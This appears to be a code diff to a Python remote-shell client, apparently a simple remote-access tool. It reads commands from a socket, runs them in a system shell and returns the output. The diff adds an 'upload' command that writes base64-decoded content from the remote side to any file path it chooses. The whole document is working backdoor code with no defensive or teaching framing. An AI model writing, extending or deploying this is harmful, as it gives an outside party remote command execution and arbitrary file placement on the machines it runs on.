@@ -2,6 +2,7 @@
 import os
 import sys
 import socket
+import base64
 import subprocess
 
 
@@ -19,7 +20,7 @@ class Client:
 
     def ReciveCommand(self):
         return self.client.recv(self.byte_size).decode()
-
+    
     def ExecuteCommand(self,command: str) -> None:
         try:
             result = subprocess.run([self.shell,"-c",command],text=True,capture_output=True)
@@ -33,14 +34,36 @@ class Client:
             self.client.send("The command did not produce any output".encode())
 
     def Main(self) -> None:
+
         while True:
             command = self.ReciveCommand()
             if command.lower() == "exit":
                 self.client.close()
                 print("Exiting...")
                 sys.exit()
-            self.ExecuteCommand(command)
-            print(f"command runned:{command}")
+
+
+
+            if command.startswith('upload'):
+                payload = command.split(':')
+                print("Payload:",payload)
+                size = int(payload[1])
+                path = payload[2]
+                self.client.send("ok".encode())
+                content = self.client.recv(size).decode()
+                try:
+                    with open(path,'wb') as f:
+                        content = base64.b64decode(content.encode())
+                        f.write(content)
+                        self.client.send("file uploaded succesfully".encode())
+                except Exception as err:
+                    print(err)
+                    self.client.send(str(err).encode())
+
+            else:
+                self.ExecuteCommand(command)
+                print(f"command runned:{command}")
+
         self.client.close()
 
 if __name__ == "__main__":
